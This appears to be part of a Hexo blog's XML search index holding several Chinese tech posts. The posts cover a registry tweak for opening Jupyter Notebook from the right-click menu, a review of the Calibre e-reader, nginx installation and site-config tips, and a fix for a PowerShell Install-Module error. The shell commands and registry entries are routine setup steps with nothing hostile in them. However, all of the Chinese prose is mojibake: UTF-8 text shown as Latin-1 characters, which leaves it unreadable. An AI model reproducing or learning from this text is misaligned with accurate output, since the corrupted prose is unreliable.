        <content type="html"><![CDATA[<p>æ¯æ¬¡æ‰“å¼€é¡¹ç›®ï¼Œéƒ½å¾—ç‚¹å‡»å¼€å§‹èœå•-æ‰¾åˆ°å¿«æ·æ–¹å¼ï¼Œç„¶åæŠŠæ–‡ä»¶æ‰”è¿›å»ï¼Œå¤ªçƒ¦äº†å¤ªçƒ¦äº†</p><p>ç„¶åå¼€å§‹ç™¾åº¦æœ‰æ²¡æœ‰ä»€ä¹ˆå³é”®ç›´æ¥æ‰“å¼€çš„åŠæ³•ï¼ŒæŠ˜è…¾ä¸€ä¸¤ä¸ªå°æ—¶æ— æœï¼Œè¿˜ä»¥ä¸ºè‡ªå·±ç¯å¢ƒæœ‰é—®é¢˜é‡è£…ä¸‰å››å›</p><p>ä¹‹åè‡ªå·±ä»”ç»†æƒ³äº†æƒ³ï¼Œæœ‰ä¸ªååˆ†ç®€å•çš„è§£å†³åŠæ³•</p><p>é¦–å…ˆæ‰¾åˆ°ä½ å¸¸æ‰“å¼€çš„Jupyter Notebook(å®˜æ–¹è¯´æ˜ä¸Šæ˜¯æ¨èç‚¹å‡»ç”¨è¿™ä¸ªå¿«æ·æ–¹å¼</p><p><img src="/../images/jupyter/1.png"></p><p>å³é”®-å±æ€§</p><p>æ‰¾åˆ°ç›®æ ‡ï¼Œå°†æ”¹æ å¤åˆ¶å‡ºæ¥ï¼Œæ¯”å¦‚æˆ‘çš„é•¿è¿™æ ·</p><pre class="line-numbers language-none"><code class="language-none">D:\Anaconda3\python.exe D:\Anaconda3\cwp.py D:\Anaconda3 D:\Anaconda3\python.exe D:\Anaconda3\Scripts\jupyter-notebook-script.py &quot;%USERPROFILE%&#x2F;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŠŠæœ€åé¢çš„</p><pre class="line-numbers language-none"><code class="language-none">&quot;%USERPROFILE%&#x2F;&quot; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ›¿æ¢ä¸º</p><pre class="line-numbers language-none"><code class="language-none">&quot;%V&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è®°å¾—æœ‰ç©ºæ ¼</p><p>åœ¨è¿™å¿ä¸ä½æƒ³åæ§½ä¸‹ï¼Œç½‘ä¸Šå„ç§æ–‡ç« ä¸åŠ¨è„‘å­çš„æŠ„æŠ„æŠ„ï¼Œæˆ‘æŠ˜è…¾åŠå¤©éƒ½ä¸è¡Œï¼Œç»“æœå‘ç°ä¸­é—´è¦åŠ ç©ºæ ¼ï¼Œæ¶å¿ƒåäº†ã€‚</p><p>ç„¶åæ•´ä¸ªregæ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">Windows Registry Editor Version 5.00[HKEY_CLASSES_ROOT\Directory\Background\shell\Open Jupyter]@&#x3D;&quot;Open with Jupyter Notebook&quot;&quot;Icon&quot;&#x3D;&quot;D:\\Anaconda3\\Menu\\jupyter.ico&quot;[HKEY_CLASSES_ROOT\Directory\Background\shell\Open Jupyter\command]@&#x3D;&quot;è¿™é‡Œæ›¿æ¢ä¹‹å‰æ•´çš„è·¯å¾„&quot;[HKEY_CLASSES_ROOT\Directory\shell\Open Jupyter]@&#x3D;&quot;Open with Jupyter Notebook&quot;&quot;Icon&quot;&#x3D;&quot;D:\\Anaconda3\\Menu\\jupyter.ico&quot;[HKEY_CLASSES_ROOT\Directory\shell\Open Jupyter\command]@&#x3D;&quot;è¿™é‡Œæ›¿æ¢ä¹‹å‰æ•´çš„è·¯å¾„&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿è¡Œä¸‹å®Œäº‹</p><p>é—®é¢˜å°±æ˜¯åªèƒ½è¿™ä¹ˆè¿è¡Œä¸€æ¬¡ï¼Œå†æƒ³æƒ³æœ‰æ²¡æœ‰å…¶ä»–åŠæ³•ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å‘ </tag>
            
            <tag> Jupyter Notebook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Calibre - è½»å°è¯´ã€æ¼«ç”»ä¸Šä½³é˜…è¯»å™¨</title>
      <link href="/p/1395865045.html"/>
      <url>/p/1395865045.html</url>
      
        <content type="html"><![CDATA[<h2 id="æ¦‚æ‹¬"><a href="#æ¦‚æ‹¬" class="headerlink" title="æ¦‚æ‹¬"></a>æ¦‚æ‹¬</h2><p>å…è´¹æ— å¹¿å‘Šï¼Œå®˜æ–¹ä¸­æ–‡ï¼Œä¸Šä½³WIN/MAC/LINUXç«¯é˜…è¯»å™¨/ç¼–è¾‘å™¨ï¼Œé€‚åˆè½»å°è¯´ï¼Œæ¼«ç”»çˆ±å¥½è€…ï¼Œkindleç”¨æˆ·ã€‚<br>æ”¯æŒæ ¼å¼ï¼šEPUBã€MOBIã€TXTã€PDFã€ZIPã€RTFã€AZW3ã€DOCXã€FB2ã€HTMLZã€LITã€LRFã€PDBã€PMLZã€RBã€RTFã€SNBã€TCRã€TXTZ</p><h2 id="ç®€è¿°"><a href="#ç®€è¿°" class="headerlink" title="ç®€è¿°"></a>ç®€è¿°</h2><p>å‰äº›å¤©æƒ³çœ‹çœ‹çœ‹çœ‹æ¼«ç”»åŸ¹å…»ä¸€ä¸‹å°‘å¥³å¿ƒï¼Œå› ä¸ºæ‰¾åˆ°çš„æ¼«ç”»èµ„æºæ˜¯epubæ ¼å¼çš„ï¼Œæ‰€ä»¥è‹¦å¯»PCä¸Šepubé˜…è¯»å™¨ã€‚<br>è¯•ç”¨äº†<strong>readium</strong>ä½œè€…çš„æ¡Œé¢ç‰ˆäº§å“<strong>Thorium</strong>ï¼Œç»“æœä¸å°½äººæ„ï¼Œåæ¥åˆè¯•äº†ä¸‹å¾®è½¯å•†åº—é‡Œçš„<strong>å¹²å‡€é˜…è¯»</strong>ï¼Œæ„Ÿè§‰å·®äº†ç‚¹ä»€ä¹ˆã€‚<br>æœ€ååœ¨çŸ¥ä¹å‘ç°äº†è¿™æ¬¾è½¯ä»¶<br>ä¸Šæ‰‹æŠŠç©äº†ä¸‹ï¼Œä¸€ç§å¦‚è·è‡³å®çš„å–œæ‚¦æ„Ÿæ²¹ç„¶è€Œç”Ÿï¼Œå¯¹å¼€å‘è€…çš„åŒ å¿ƒèµå¹ä¸å·²ã€‚ä»è½¯ä»¶ä¸­èƒ½æ˜æ˜¾æ„Ÿè§‰åˆ°å¼€å‘è€…é‚£ç§ä»”ç»†æ‰“ç£¨ï¼Œæˆ‘ä¹Ÿå¾ˆå¥‡æ€ªï¼Œåæ­£å°±æ˜¯è¿™ç§çªå¦‚å…¶æ¥çš„æ„Ÿè§‰ã€‚<br>é¢å¯¹è¿™æ¬¾è½¯ä»¶ï¼ŒçœŸçš„æ»¡æ»¡çš„å¹¸ç¦æ„Ÿã€‚æ­£å¥½å¿ƒè¡€æ¥æ½®ï¼Œå†™ç¯‡æ–‡ç« è®°å½•ä¸€ä¸‹</p><p>ä½œè€…ç®€ä»‹å•¥çš„å°±ä¸è¯´äº†ï¼Œæèµ çš„æ—¶å€™çœ‹ä½œè€…çš„ç…§ç‰‡æœ‰ç‚¹åƒå°åº¦äººï¼Ÿ</p><h2 id="ç•Œé¢å±•ç¤º"><a href="#ç•Œé¢å±•ç¤º" class="headerlink" title="ç•Œé¢å±•ç¤º"></a>ç•Œé¢å±•ç¤º</h2><h3 id="æ¸…çˆ½çš„ç•Œé¢"><a href="#æ¸…çˆ½çš„ç•Œé¢" class="headerlink" title="æ¸…çˆ½çš„ç•Œé¢"></a>æ¸…çˆ½çš„ç•Œé¢</h3><p><img src="/../images/calibre/1.jpg" alt="img"></p><h3 id="å¯åˆ‡æ¢å¸ƒå±€"><a href="#å¯åˆ‡æ¢å¸ƒå±€" class="headerlink" title="å¯åˆ‡æ¢å¸ƒå±€"></a>å¯åˆ‡æ¢å¸ƒå±€</h3><p><img src="/../images/calibre/2.jpg" alt="img"></p><h3 id="å¤šæ ·åŒ–è®¾ç½®"><a href="#å¤šæ ·åŒ–è®¾ç½®" class="headerlink" title="å¤šæ ·åŒ–è®¾ç½®"></a>å¤šæ ·åŒ–è®¾ç½®</h3><p>å¯æ”¹<strong>å›¾æ ‡ã€ç•Œé¢å­—ä½“ã€æ–‡æœ¬å­—ä½“</strong><br><img src="/../images/calibre/3.jpg" alt="img"><br><img src="/../images/calibre/4.jpg" alt="img"></p><h3 id="åœ¨çº¿æœä¹¦ã€æ–°é—»æŠ“å–-è‡ªå®šä¹‰RSSæº"><a href="#åœ¨çº¿æœä¹¦ã€æ–°é—»æŠ“å–-è‡ªå®šä¹‰RSSæº" class="headerlink" title="åœ¨çº¿æœä¹¦ã€æ–°é—»æŠ“å– è‡ªå®šä¹‰RSSæº"></a>åœ¨çº¿æœä¹¦ã€æ–°é—»æŠ“å– è‡ªå®šä¹‰RSSæº</h3><p><img src="/../images/calibre/5.jpg" alt="img"><br><img src="/../images/calibre/6.jpg" alt="img"></p><h3 id="æ’ä»¶"><a href="#æ’ä»¶" class="headerlink" title="æ’ä»¶"></a>æ’ä»¶</h3><p><img src="/../images/calibre/7.jpg" alt="img"></p><hr><p>é‡Œé¢èƒ½å®šåˆ¶åŒ–çš„åœ°æ–¹çœŸçš„å¾ˆå¤šï¼ŒåŠŸèƒ½ä¸°å¯Œä½†ä¸è‡ƒè‚¿ï¼Œè¿˜æœ‰æ–‡æœ¬ç¼–è¾‘åŠŸèƒ½ï¼Œå¯ä»¥æ‹¿æ¥åšepubä¹‹ç±»çš„ã€‚è™½ç„¶ç»å¤§éƒ¨åˆ†åŠŸèƒ½æˆ‘ä¹Ÿåªæ˜¯çœ‹çœ‹ç”¨ä¸æ¥ï¼Œä½†è¿™è½¯ä»¶å¹¶æ²¡æœ‰ç»™æˆ‘ä¸€ç§ä¸“ä¸šäººå£«ä½¿ç”¨çš„æ„Ÿè§‰ï¼Œè€Œæ˜¯ååˆ†çš„å¹³æ˜“è¿‘äººã€‚</p><h2 id="æ›´æ”¹æ–‡æœ¬å­—ä½“æ¼”ç¤º"><a href="#æ›´æ”¹æ–‡æœ¬å­—ä½“æ¼”ç¤º" class="headerlink" title="æ›´æ”¹æ–‡æœ¬å­—ä½“æ¼”ç¤º"></a>æ›´æ”¹æ–‡æœ¬å­—ä½“æ¼”ç¤º</h2><p><img src="/../images/calibre/8.jpg" alt="img"><br><img src="/../images/calibre/9.jpg" alt="img"></p><p>ç„¶åè½¬æ¢ä¸€ä¸‹ï¼Œä¼šç”Ÿæˆæ–°çš„å†…åµŒå­—ä½“çš„æ–‡æœ¬ï¼ŒåŸæ¥çš„æ–‡æœ¬è¿˜æ˜¯åœ¨çš„<br><img src="/../images/calibre/10.jpg" alt="img"></p><p><img src="/../images/calibre/11.jpg" alt="img"></p><p>æ³¨é‡ŠåŠŸèƒ½ä¹Ÿæœ‰<br><img src="/../images/calibre/12.jpg" alt="img"></p><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>çœŸçš„å¾ˆå¼ºå¤§ï¼Œæ›´å¤šåŠŸèƒ½ä¹Ÿåœ¨æŒ–æ˜ä¸­ï¼Œæ…¢æ…¢æ›´æ–°ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Calibre </tag>
            
            <tag> epub </tag>
            
            <tag> é˜…è¯»å™¨ </tag>
            
            <tag> è½¯ä»¶æ¨è </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginxåˆæ­¥æ­å»ºäºŒä¸‰äº‹</title>
      <link href="/p/777074487.html"/>
      <url>/p/777074487.html</url>
      
        <content type="html"><![CDATA[<h2 id="nginxæ³¨æ„äº‹é¡¹"><a href="#nginxæ³¨æ„äº‹é¡¹" class="headerlink" title="nginxæ³¨æ„äº‹é¡¹"></a>nginxæ³¨æ„äº‹é¡¹</h2><p>ä¸€ç›´ä»¥æ¥éƒ½æ˜¯ç”¨å®å¡”å»ºç«™ï¼Œä»Šå¤©ç‰¹æ®Šæƒ…å†µï¼Œéœ€è¦å•ç‹¬è£…ä¸ªnginxç”¨ã€‚<br>ç¯å¢ƒï¼šUbuntu16.06<br>é¦–å…ˆå®‰è£…nginxï¼Œç›´æ¥aptè£…çš„æ˜¯ä½ç‰ˆæœ¬ï¼Œæ‰€ä»¥</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">wget http:&#x2F;&#x2F;nginx.org&#x2F;keys&#x2F;nginx_signing.keyapt-key add nginx_signing.keyecho -e &quot;deb http:&#x2F;&#x2F;nginx.org&#x2F;packages&#x2F;ubuntu&#x2F; xenial nginx&quot; &gt;&gt; &#x2F;etc&#x2F;apt&#x2F;sources.listecho -e &quot;deb-src http:&#x2F;&#x2F;nginx.org&#x2F;packages&#x2F;ubuntu&#x2F; xenial nginx&quot; &gt;&gt; &#x2F;etc&#x2F;apt&#x2F;sources.listapt updateapt install nginx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ ·å°±æ˜¯å½“å‰æœ€æ–°ç¨³å®šç‰ˆçš„äº†ã€‚<br>ç„¶åå‘å°±å¼€å§‹äº†ã€‚<br>ç™¾åº¦åŠå¤©nginxæ­å»ºwebæ•™ç¨‹(å¤§å¤šæ–‡ç« éƒ½ä½ æŠ„æˆ‘æˆ‘æŠ„ä½ ï¼Œä¹Ÿæ˜¯é†‰äº†)<br>æ€ä¹ˆæéƒ½ä¸è¡Œï¼ŒæŠ˜è…¾å‡ ä¸ªå°æ—¶çƒ¦æ­»äº†ã€‚</p><p>å†™çš„æ¯”è¾ƒæ ‡å‡†çš„æ–¹æ³•éƒ½æ˜¯åœ¨ <strong>sites-available</strong> é‡Œåˆ›å»ºé…ç½®ç„¶åè½¯é“¾æ¥åˆ° <strong>sites-enabled</strong><br>æ²¡é”™ï¼Œä½†æˆ‘ä¸»è¦å¼ºè°ƒä¸€ç‚¹ï¼Œä¹Ÿå°±æ˜¯è¢«å‘çš„åœ°æ–¹<br>æ³¨æ„è¦åœ¨ <strong>/etc/nginx/nginx.conf</strong> é‡ŒåŠ å…¥ <code>include /etc/nginx/sites-enabled/*;</code></p><blockquote><p>conf.dï¼šç”¨æˆ·è‡ªå·±å®šä¹‰çš„confé…ç½®æ–‡ä»¶<br>sites-availableï¼šç³»ç»Ÿé»˜è®¤è®¾ç½®çš„é…ç½®æ–‡ä»¶<br>sites-enabledï¼šç”±sites-availableä¸­çš„é…ç½®æ–‡ä»¶è½¬æ¢ç”Ÿæˆ<br>nginx.confï¼šæ±‡æ€»ä»¥ä¸Šä¸‰ä¸ªé…ç½®æ–‡ä»¶çš„å†…å®¹ï¼ŒåŒæ—¶é…ç½®æˆ‘ä»¬æ‰€éœ€è¦çš„å‚æ•°</p></blockquote><p>æ‰€ä»¥æœ‰ä¸¤ç§åŠæ³•</p><ul><li>ç›´æ¥åœ¨<strong>conf.d/</strong> ä¸‹åˆ›å»º<strong>domain.com.conf</strong></li><li>åœ¨<strong>sites-available</strong> ä¸‹åˆ›å»º<strong>domain.com</strong> ç„¶å<code>ln -s /etc/nginx/sites-available/excalibur.moe /etc/nginx/sites-enabled/</code>è½¯è¿æ¥è¿‡å»</li></ul><p><strong>nginx.conf</strong> æ–‡ä»¶ä¸­ï¼Œè°çš„includeåœ¨ä¸Šé¢è°çš„ä¼˜å…ˆçº§å°±é«˜</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">service  nginx reloadservice  nginx startservice  nginx stopservice  nginx restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> å‰ç«¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å‘ </tag>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Install-Module æ‰¾ä¸åˆ°ä¸å‚æ•°åç§°ScopeåŒ¹é…çš„å‚æ•°</title>
      <link href="/p/528086098.html"/>
      <url>/p/528086098.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.loli.net/2019/12/01/HtCcs9mBKgxGNXO.png"><br>ä½¿ç”¨ Install-Module posh-git æ—¶æŠ¥é”™ï¼Œæç¤ºæ‰¾ä¸åˆ°ä¸å‚æ•°åç§°ScopeåŒ¹é…çš„å‚æ•°ã€‚<br>è°·æ­Œä¸€ä¸ªå¤šå°æ—¶ï¼Œå‘ç°æ²¡æœ‰ç›¸å…³è§£ã€‚æ€€ç–‘äººç”Ÿ<br>ä»”ç»†ä¸€çœ‹ä»£ç æ‰å‘ç°ï¼Œæç¤ºpsgetXXXXXX<br>æƒ³æƒ³åº”è¯¥æ˜¯ä¹‹å‰ä¸è§„èŒƒé…ç½®powershellé—ç•™ä¸‹æ¥çš„ä¸œè¥¿<br>ç®¡ç†å‘˜è¿è¡Œpowershell è¾“å…¥</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ¸…ç©º ~\WindowsPowerShell æ–‡æ¡£ä¸‹çš„ Microsoft.PowerShell_profile é…ç½®æ–‡ä»¶ã€‚<br>åˆ é™¤ ~\WindowsPowerShell\Modules æ–‡æ¡£ä¸‹çš„ psgetå’Œposh-git (åæ­£å°±æ˜¯æ¸…ç†å¹²å‡€)<br>é‡æ–°Install-Module posh-git<br>æˆåŠŸï¼Œç»“æŸã€‚<br>é™„ä¸¤ç¯‡ç¾åŒ–æŒ‡å—ï¼š<br><a href="https://zhuanlan.zhihu.com/p/51901035">https://zhuanlan.zhihu.com/p/51901035</a><br><a href="https://nexmoe.com/1519803391.html">https://nexmoe.com/1519803391.html</a></p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å‘ </tag>
            
            <tag> Powershell </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
